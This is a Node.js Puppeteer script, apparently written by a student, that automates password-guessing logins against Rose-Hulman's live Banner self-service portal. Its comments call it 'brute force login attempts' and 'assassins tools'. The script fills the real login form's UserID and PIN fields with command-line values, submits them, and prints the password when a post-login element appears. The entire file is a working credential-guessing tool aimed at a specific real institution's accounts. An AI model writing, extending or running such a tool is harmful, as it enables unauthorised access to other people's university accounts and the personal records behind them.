// rose hulman assassins tools !!!
//head empty unoptimal brute force login attempts
//at work no work to do rn lol

//call w/username, pass, and maybe a timeout not rn but maybe later

const pptr = require('puppeteer');

//obligatory reference to powershell script i will make someday
//should just like. write lua for this. crossplatform and all.
//will do later whatever LOL

const username = process.argv[2];
const pass = process.argv[3];
//console.log(process.argv);

(async() => {
   //console.log("entered async function hiiiiiiii");
   const browser = await pptr.launch({headless: 'shell'});
   const page = await browser.newPage();
   page.setDefaultTimeout(1500); //experiement w/this w/correct pass
   //await page.setViewport({ width: 1366, height: 768});
   await page.goto('https://bannerssb.rose-hulman.edu/BanSS/twbkwbis.P_GenMenu?name=bmenu.P_GenAppMnu', {waitUntil: 'networkidle2'});
   //await page.screenshot({path: "./page_has_loaded_hiii.png"});
   //console.log("page loaded yay???");

   //js is slow with strings...
   //whatever!

   //get the rel css
   const loginField = 'html body div.pagebodydiv form table.dataentrytable tbody tr td.dedefault input#UserID';
   const passField = 'html body div.pagebodydiv form table.dataentrytable tbody tr td.dedefault input#PIN';
   const submit = 'html body div.pagebodydiv form p input';

   //console.log(page.url()); //inital url given
   //........... my password....

   await page.click(loginField);
   await page.type(loginField, username);
   await page.keyboard.press('Tab');
   await page.type(passField, pass);
   await page.click(submit);

   //handle url waiting.....????
   //wait for the url to include welocme bc thats the main page
   //await page.waitForFunction("window.location.pathname.includes('msg=WELCOME')"); //here rn for testing but if works have this w/a timer
   await page.waitForSelector("html body div.headerwrapperdiv div.headerlinksdiv span.pageheaderlinks2 map table.plaintable tbody tr td.pldefault table.plaintable tbody tr td.taboff a"); //full css path. whatever
   //^note this is the link to newer bannerweb and this does require mfa so dont click bc idc THAT much about assassins
   //await page.screenshot({path: "./submitted_GOODithink.png"});

   console.log(pass);

   browser.close();
})();